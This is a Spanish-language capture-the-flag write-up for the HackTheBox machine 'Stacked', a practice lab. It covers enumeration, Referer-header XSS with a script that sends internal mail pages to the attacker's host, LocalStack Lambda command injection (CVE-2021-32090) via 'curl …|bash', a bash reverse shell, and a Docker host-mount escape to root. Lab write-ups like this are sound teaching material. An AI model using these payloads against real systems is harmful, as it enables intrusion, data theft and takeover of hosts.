---
layout: post
title: Stacked
date: 2023-06-15
description:
img:
fig-caption:
tags: [eWPT, eWPTXv2, OSWE]
---
___

<center><img src="/writeups/assets/img/Stacked-htb/Stacked.png" alt="" style="height: 394px; width:520px;"></center>

***

# Conocimientos

* Enumeración Web

* Inyección XSS

* Enumeración AWS

* Enumeración Lambda

* Creación de función Lambda customizada (NodeJS)

* RCE en LockStack

* Abuso de parámetro en nombre de función AWS

* Abuso de Docker (Escalada de Privilegios)

***

# Reconocimiento

## Escaneo de puertos con nmap

### Descubrimiento de puertos abiertos

```null
nmap -p- --open --min-rate 5000 -n -Pn -sS 10.10.11.112 -oG openports
Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-15 17:04 GMT
Nmap scan report for 10.10.11.112
Host is up (0.063s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
2376/tcp open  docker

Nmap done: 1 IP address (1 host up) scanned in 11.79 seconds
```

### Escaneo de versión y servicios de cada puerto

```null
nmap -sCV -p22,80,2376 10.10.11.112 -oN portscan
Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-15 17:05 GMT
Nmap scan report for 10.10.11.112
Host is up (0.40s latency).

PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 12:8f:2b:60:bc:21:bd:db:cb:13:02:03:ef:59:36:a5 (RSA)
|   256 af:f3:1a:6a:e7:13:a9:c0:25:32:d0:2c:be:59:33:e4 (ECDSA)
|_  256 39:50:d5:79:cd:0e:f0:24:d3:2c:f4:23:ce:d2:a6:f2 (ED25519)
80/tcp   open  http        Apache httpd 2.4.41
|_http-title: Did not follow redirect to http://stacked.htb/
|_http-server-header: Apache/2.4.41 (Ubuntu)
2376/tcp open  ssl/docker?
| ssl-cert: Subject: commonName=stacked
| Subject Alternative Name: DNS:localhost, DNS:stacked, IP Address:0.0.0.0, IP Address:127.0.0.1, IP Address:172.17.0.1
| Not valid before: 2022-08-17T15:41:56
|_Not valid after:  2025-05-12T15:41:56
Service Info: Host: stacked.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 45.25 seconds
```

Añado el dominoi ```stacked.htb``` al ```/etc/hosts```

## Puerto 80 (HTTP)

Con ```whatweb``` analizo las tecnologías que emplea el servidor web

```null
whatweb http://10.10.11.112
http://10.10.11.112 [302 Found] Apache[2.4.41], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.11.112], RedirectLocation[http://stacked.htb/], Title[302 Found]
http://stacked.htb/ [200 OK] Apache[2.4.41], Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.11.112], JQuery, Meta-Author[FREEHTML5.CO], Modernizr[2.6.2.min], Open-Graph-Protocol, Script, Title[STACKED.HTB], X-UA-Compatible[IE=edge]
```

La página principal se ve así:

<img src="/writeups/assets/img/Stacked-htb/1.png" alt="">

Aplico fuzzing para descubrir rutas

```null
wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt 'http://stacked.htb/FUZZ'
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://stacked.htb/FUZZ
Total requests: 220546

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                         
=====================================================================

000000002:   301        9 L      28 W       311 Ch      "images"                                                                                                                                        
000000536:   301        9 L      28 W       308 Ch      "css"                                                                                                                                           
000002757:   301        9 L      28 W       310 Ch      "fonts"                                                                                                                                         
000045226:   200        158 L    394 W      5055 Ch     "http://stacked.htb/"  
```

Pero no encuentro nada de interés, así que paso a enumerar subdominios

```null
wfuzz -c -t 200 --hw=26 -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.stacked.htb" http://stacked.htb/
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://stacked.htb/
Total requests: 4989

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                         
=====================================================================

000001183:   200        444 L    1779 W     30268 Ch    "portfolio"                                                                                                                                     

Total time: 0
Processed Requests: 4989
Filtered Requests: 4988
Requests/sec.: 0
```

Añado ```portfolio.stacked.htb``` al ```/etc/hosts``` y lo abro en el navegador

<img src="/writeups/assets/img/Stacked-htb/2.png" alt="">

Puedo descargar un archivo

<img src="/writeups/assets/img/Stacked-htb/3.png" alt="">

Corresponde a un archivo de ```docker-compose```

```null
wget http://portfolio.stacked.htb/files/docker-compose.yml
```

```null
cat docker-compose.yml
version: "3.3"

services:
  localstack:
    container_name: "${LOCALSTACK_DOCKER_NAME-localstack_main}"
    image: localstack/localstack-full:0.12.6
    network_mode: bridge
    ports:
      - "127.0.0.1:443:443"
      - "127.0.0.1:4566:4566"
      - "127.0.0.1:4571:4571"
      - "127.0.0.1:${PORT_WEB_UI-8080}:${PORT_WEB_UI-8080}"
    environment:
      - SERVICES=serverless
      - DEBUG=1
      - DATA_DIR=/var/localstack/data
      - PORT_WEB_UI=${PORT_WEB_UI- }
      - LAMBDA_EXECUTOR=${LAMBDA_EXECUTOR- }
      - LOCALSTACK_API_KEY=${LOCALSTACK_API_KEY- }
      - KINESIS_ERROR_PROBABILITY=${KINESIS_ERROR_PROBABILITY- }
      - DOCKER_HOST=unix:///var/run/docker.sock
      - HOST_TMP_FOLDER="/tmp/localstack"
    volumes:
      - "/tmp/localstack:/tmp/localstack"
      - "/var/run/docker.sock:/var/run/docker.sock"
```

La versión de ```Lockstack``` es la ```0.12.6```. Busco por vulnerabilidades asociadas a esta. Según [Snyk](https://security.snyk.io/package/pip/localstack/0.12.6) es vulnerable a RCE. Intercepto la petición de la sección de contacto

<img src="/writeups/assets/img/Stacked-htb/4.png" alt="">

Envío y recibo una respuesta en ```JSON```

```null
POST /process.php HTTP/1.1
Host: portfolio.stacked.htb
Content-Length: 78
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://portfolio.stacked.htb
Referer: http://portfolio.stacked.htb/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

fullname=test&email=test%40test.com&tel=123456789012&subject=test&message=test
```

```null
HTTP/1.1 200 OK
Date: Fri, 16 Jun 2023 08:30:27 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Length: 54
Connection: close
Content-Type: text/json; charset=utf8

{"success":"Your form has been submitted. Thank you!"}
```

Intento efectuar un XSS, pero salta una advertencia

```null
fullname=<script src="http://10.10.16.6/test.js"></script>&email=test%40test.com&tel=123456789012&subject=test&message=test
```

```null
{"success":false,"error":"XSS detected!"}
```

Con las etiquetas ```<img>``` puedo enviarlo sin problemas, pero no voy a recibir ninguna petición a mi equipo. Voy a introducir el payload en todas las cabeceras innecesarias

```null
User-Agent: <script src="http://10.10.16.6/test.js"></script>
Origin: <script src="http://10.10.16.6/origin.js"></script>
Referer: <script src="http://10.10.16.6/referer.js"></script>
```

Una de ellas es vulnerable

```null
nc -nlvp 80
listening on [any] 80 ...
connect to [10.10.16.6] from (UNKNOWN) [10.10.11.112] 54270
GET /referer.js HTTP/1.1
Host: 10.10.16.6
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://mail.stacked.htb/read-mail.php?id=2
Connection: keep-alive
```

Además la dirección URL desde donde se tramitó, tiene un parámetro ```?id``` que podría ser vulnerable a inyeccion SQL o LFI. El subdominio ```mail.stacked.htb``` no es accesible de mi lado. Puedo tratar de derivar el XSS a un CSRF para traerme el código fuente de esa página

Creo un archivo ```referer.js``` con lo siguiente:

```null
var url = "http://mail.stacked.htb/";
var req1 = new XMLHttpRequest();

req1.open('GET', url, false);
req1.send();

var response = req1.responseText;

var req2 = new XMLHttpRequest();
req2.open('POST', "http://10.10.16.6:8000", false);
req2.send(response);
```

Lo hosteo con python por el puerto 80 y me quedo en escucha con ```netcat``` por el puerto 8000

```null
nc -nlvp 8000 > index.html
listening on [any] 8000 ...
connect to [10.10.16.6] from (UNKNOWN) [10.10.11.112] 34548
```

Todo el output está almacenado en ```index.html```. Desde el navegador cargo su contenido

<img src="/writeups/assets/img/Stacked-htb/5.png" alt="">

Al hacer hovering sobre los correos puedo ver que se se referencian por el identificador. Traigo el primero

<img src="/writeups/assets/img/Stacked-htb/6.png" alt="">

Modifico en el script la variable de la URL

```null
var url = "http://mail.stacked.htb/read-mail.php?id=1";
```

Y obtengo el contenido

```null
curl -s -X GET localhost | html2text | tail -n 15 | head -n 4
Hey Adam, I have set up S3 instance on s3-testing.stacked.htb so that you can
configure the IAM users, roles and permissions. I have initialized a serverless
instance for you to work from but keep in mind for the time being you can only
run node instances. If you need anything let me know. Thanks.
```

Agrego el dominio ```s3-testing.stacked.htb``` al ```/etc/hosts```. Le tramito una petición por GET

```null
curl -s -X GET http://s3-testing.stacked.htb/ | jq
{
  "status": "running"
}
```

Miro las cabeceras de respuesta

```null
curl -s -X GET http://s3-testing.stacked.htb/ -I
HTTP/1.1 404 
Date: Fri, 16 Jun 2023 09:07:49 GMT
Server: hypercorn-h11
content-type: text/html; charset=utf-8
content-length: 21
access-control-allow-origin: *
access-control-allow-methods: HEAD,GET,PUT,POST,DELETE,OPTIONS,PATCH
access-control-allow-headers: authorization,content-type,content-length,content-md5,cache-control,x-amz-content-sha256,x-amz-date,x-amz-security-token,x-amz-user-agent,x-amz-target,x-amz-acl,x-amz-version-id,x-localstack-target,x-amz-tagging
access-control-expose-headers: x-amz-version-id
```

Se está empleando ```AWS```. Puedo intentar crear una lambda function. Creo una configuración cualquiera

```null
aws configure
AWS Access Key ID [****************6TDC]: test
AWS Secret Access Key [****************Fo1A]: test
Default region name [us-east-1]: 
Default output format [json]: 
``` 

En este [artículo](https://docs.aws.amazon.com/cli/latest/reference/lambda/create-function.html) explican como crear una función

<img src="/writeups/assets/img/Stacked-htb/7.png" alt="">

Y en la [Documentación de Amazon](https://docs.aws.amazon.com/lambda/latest/dg/nodejs-handler.html) dan un ejemplo en ```Node.js```. La adapto para que, a modo de traza, devuelva una cadena de texto

```null
exports.handler = async function (event, context) {
  return "Testing";
};
```

Lo comprimo en un ```ZIP```

```null
zip test.zip test.js
  adding: test.js (stored 0%)
```

Y creo la función

```null
aws lambda create-function --endpoint-url="http://s3-testing.stacked.htb/" --function-name 'test' --runtime nodejs10.x --zip-file fileb://test.zip --handler test.handler --role testing
{
    "FunctionName": "test",
    "FunctionArn": "arn:aws:lambda:us-east-1:000000000000:function:test",
    "Runtime": "nodejs10.x",
    "Role": "testing",
    "Handler": "test.handler",
    "CodeSize": 239,
    "Description": "",
    "Timeout": 3,
    "LastModified": "2023-06-16T09:35:56.501+0000",
    "CodeSha256": "xhJJJinp4ytaVlsVk7Uc0GQMkOhHESbBN6emtnHR0Ag=",
    "Version": "$LATEST",
    "VpcConfig": {},
    "TracingConfig": {
        "Mode": "PassThrough"
    },
    "RevisionId": "3c4a0f81-ef24-4192-8441-efece9f64a02",
    "State": "Active",
    "LastUpdateStatus": "Successful",
    "PackageType": "Zip"
}
```

Ejecuto la función y almaceno su output en un archivo

```null
aws lambda invoke --endpoint-url="http://s3-testing.stacked.htb/" --function-name 'test' output.txt
{
    "StatusCode": 200,
    "LogResult": "",
    "ExecutedVersion": "$LATEST"
}
```

```null
cat output.txt
"Testing"
```

Para ejecutar comandos, hay que abusar del parámetro ```functionName```, tal y como había visto en el [CVE-2021-32090](https://nvd.nist.gov/vuln/detail/CVE-2021-32090), pero solo se ejecutan a través del panel de Administración de ```LocalStack```. Puedo abusar del XSS para que con ```document.location``` redirigir al usuario a una página concreta. En el ```docker-compose.yml``` había visto que el puerto 8080 es donde está montado a lo que quiero acceder

```null
ports:
  - "127.0.0.1:443:443"
  - "127.0.0.1:4566:4566"
  - "127.0.0.1:4571:4571"
  - "127.0.0.1:${PORT_WEB_UI-8080}:${PORT_WEB_UI-8080}"
```

Modifico la cabecera ```Referer``` para la ocasión

```null
Referer: <script>document.location="http://127.0.0.1:8080"</script>
```

Inyecto el comando en la función ```Lambda```

```null
aws lambda create-function --endpoint-url="http://s3-testing.stacked.htb/" --function-name 'test; curl 10.10.16.6|bash' --runtime nodejs10.x --zip-file fileb://test.zip --handler test.handler --role testing
```

Creo un archivo ```index.html``` que se encargue de enviar una reverse shell

```null
#!/bin/bash

bash -c 'bash -i >& /dev/tcp/10.10.16.6/443 0>&1'
```

Envío la petición de la sección de contacto para que se acontezca el XSS y al rato obtengo recibo la conexión en una sesión de ```netcat```

```null
nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.6] from (UNKNOWN) [10.10.11.112] 35192
bash: cannot set terminal process group (21): Not a tty
bash: no job control in this shell
bash: /root/.bashrc: Permission denied
bash-5.0$ script /dev/null -c bash
script /dev/null -c bash
bash: script: command not found
bash-5.0$ ^Z
zsh: suspended  nc -nlvp 443
❯ stty raw -echo; fg
[1]  + continued  nc -nlvp 443
                              reset xterm
```

Me cambio a una ```sh``` ya que la bash entra en conflicto. Estoy dentro de un contenedor

```null
/opt/code/localstack $ ifconfig
eth0      Link encap:Ethernet  HWaddr 02:42:AC:11:00:02  
          inet addr:172.17.0.2  Bcast:172.17.255.255  Mask:255.255.0.0
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:6234 errors:0 dropped:0 overruns:0 frame:0
          TX packets:5220 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:524621 (512.3 KiB)  TX bytes:5516271 (5.2 MiB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:8454 errors:0 dropped:0 overruns:0 frame:0
          TX packets:8454 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:1059311 (1.0 MiB)  TX bytes:1059311 (1.0 MiB)
```

Puedo ver la primera flag

```null
~ $ cat user.txt 
342a334294be29e200fb30783206754e
```

# Escalada

Subo el ```pspy``` para detectar tareas que se ejecutan a intervalos regulares de tiempo. Creo de nuevo la función lambda y veo el comando que ejecuta ```root```

```null
2023/06/16 10:24:22 CMD: UID=0    PID=1473   | /bin/sh -c cd /tmp/localstack/zipfile.43027463; unzip -o -q /tmp/localstack/zipfile.43027463/original_lambda_archive.zip 
```

Después, la vuelvo a invocar

```null
2023/06/16 10:25:35 CMD: UID=0    PID=1478   | docker create -i -e DOCKER_LAMBDA_USE_STDIN=1 -e LOCALSTACK_HOSTNAME=172.17.0.2 -e EDGE_PORT=4566 -e _HANDLER=test.handler -e AWS_LAMBDA_FUNCTION_TIMEOUT=3 -e AWS_LAMBDA_FUNCTION_NAME=test -e AWS_LAMBDA_FUNCTION_VERSION=$LATEST -e AWS_LAMBDA_FUNCTION_INVOKED_ARN=arn:aws:lambda:us-east-1:000000000000:function:test -e AWS_LAMBDA_COGNITO_IDENTITY={} -e NODE_TLS_REJECT_UNAUTHORIZED=0 --rm lambci/lambda:nodejs10.x test.handler 
2023/06/16 10:25:35 CMD: UID=0    PID=1477   | /bin/sh -c CONTAINER_ID="$(docker create -i   -e DOCKER_LAMBDA_USE_STDIN="$DOCKER_LAMBDA_USE_STDIN" -e LOCALSTACK_HOSTNAME="$LOCALSTACK_HOSTNAME" -e EDGE_PORT="$EDGE_PORT" -e _HANDLER="$_HANDLER" -e AWS_LAMBDA_FUNCTION_TIMEOUT="$AWS_LAMBDA_FUNCTION_TIMEOUT" -e AWS_LAMBDA_FUNCTION_NAME="$AWS_LAMBDA_FUNCTION_NAME" -e AWS_LAMBDA_FUNCTION_VERSION="$AWS_LAMBDA_FUNCTION_VERSION" -e AWS_LAMBDA_FUNCTION_INVOKED_ARN="$AWS_LAMBDA_FUNCTION_INVOKED_ARN" -e AWS_LAMBDA_COGNITO_IDENTITY="$AWS_LAMBDA_COGNITO_IDENTITY" -e NODE_TLS_REJECT_UNAUTHORIZED="$NODE_TLS_REJECT_UNAUTHORIZED"   --rm "lambci/lambda:nodejs10.x" "test.handler")";docker cp "/tmp/localstack/zipfile.43027463/." "$CONTAINER_ID:/var/task"; docker start -ai "$CONTAINER_ID"; 
2023/06/16 10:25:35 CMD: UID=0    PID=1484   | docker cp /tmp/localstack/zipfile.43027463/. 91f63f77d4c80cf07ccc625072b67d6323ef331fcc7ed74db5062daf477553b6:/var/task 
```

Al final de uno de ellos aparece ```test.handler```, lo cual puedo controlar como ```input```. Me envío una reverse shell

```null
aws lambda create-function --endpoint-url="http://s3-testing.stacked.htb/" --function-name 'test' --runtime nodejs10.x --zip-file fileb://test.zip --handler '$(curl 10.10.16.6 | bash > /tmp/testing)' --role testing
```

```null
aws lambda invoke --endpoint-url="http://s3-testing.stacked.htb/" --function-name 'test' output.txt
```

Gano acceso como ```root``` en el contenedor

```null
/tmp $ ls -l /bin/bash
-rwsr-xr-x    1 root     root        735512 Nov 16  2019 /bin/bash
```

Gano acceso en una sesión de ```netcat```

```null
nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.6] from (UNKNOWN) [10.10.11.112] 36564
bash: cannot set terminal process group (1770): Not a tty
bash: no job control in this shell
bash-5.0# script /dev/null -c sh 
script /dev/null -c sh
bash: script: command not found
bash-5.0# python3 -c 'import pty; pty.spawn("/bin/sh")'
python3 -c 'import pty; pty.spawn("/bin/sh")'
/opt/code/localstack # ^[[11;24R^Z
zsh: suspended  nc -nlvp 443
❯ stty raw -echo; fg
[1]  + continued  nc -nlvp 443
                              reset xterm
```

Ahora puedo crear un contenedor que monte la raiz del sistema host y ver la segunda flag

```null
/ # docker images
REPOSITORY                   TAG                 IMAGE ID            CREATED             SIZE
localstack/localstack-full   0.12.6              7085b5de9f7c        23 months ago       888MB
localstack/localstack-full   <none>              0601ea177088        2 years ago         882MB
lambci/lambda                nodejs12.x          22a4ada8399c        2 years ago         390MB
lambci/lambda                nodejs10.x          db93be728e7b        2 years ago         385MB
lambci/lambda                nodejs8.10          5754fee26e6e        2 years ago         813MB
```

```null
/ # docker run -v /:/mnt --entrypoint bash -u root -it bfe18d661174
```

Ejecuto una ```bash en el contedor y puedo ver la segunda flag

```null
/ # docker exec -it 35ab7d510ed0 bash
bash-5.0# cat /mnt/root/root.txt 
6cbba531ad385be20dabdbd4c2ae30c2
```